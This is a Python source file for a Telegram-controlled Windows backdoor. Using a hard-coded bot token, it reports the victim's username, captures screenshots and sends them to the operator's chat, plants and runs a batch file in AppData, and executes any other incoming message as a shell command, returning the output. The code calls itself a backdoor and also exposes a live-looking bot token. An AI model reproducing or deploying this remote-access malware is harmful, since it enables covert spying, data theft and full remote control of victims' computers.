from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
import os
import pyautogui
import time

TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"

def start(update,context):
    username = ""
    req = os.popen("echo %username%")

    for us in req:
        username+= us

    update.message.reply_text(f"Connection Established => {username} PC")

def answer(update,context):
    txt = update.message.text.lower()

    if "savescreen" in txt:

        msg = update.message.reply_text("Taking Screenshoot....")

        img = pyautogui.screenshot()
        img.save("tools\\photo.png")

        msg.edit_text("photo.png is on the way....")

        update.message.reply_photo(open("tools\\photo.png","rb"))

        msg.edit_text("😏")

    elif "set-killswitch" in txt:
        os.system("echo S | move tools\\update.bat C:\\Users\\%username%\\AppData\\Local\\Programs\\")
        update.message.reply_text("KillSwitch Triggered => Run 'killswitch'")

    elif "killswitch" in txt:
        os.system("start C:\\Users\\%username%\\AppData\\Local\\Programs\\update.bat")
        update.message.reply_text("Backdoor Deleted ! 😏")



    elif "setvol" in txt:

        try:
            value = txt.split()[1]

            os.system(f"cd tools & setvol {value}")
            update.message.reply_text("setvol.exe Runned Correctly")

        
        except IndexError:
            update.message.reply_text("setvol.exe requires an Argument")

        
    else:
        try:
                
            command = ""
            response = os.popen(txt)

            msg = update.message.reply_text("Command Executing....")
            
            for line in response:
                command+= line
            
            msg.edit_text(command)
        
        except Exception as e:
            msg.edit_text(e)
        
updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(MessageHandler(Filters.text, answer))
print("-")
updater.start_polling()
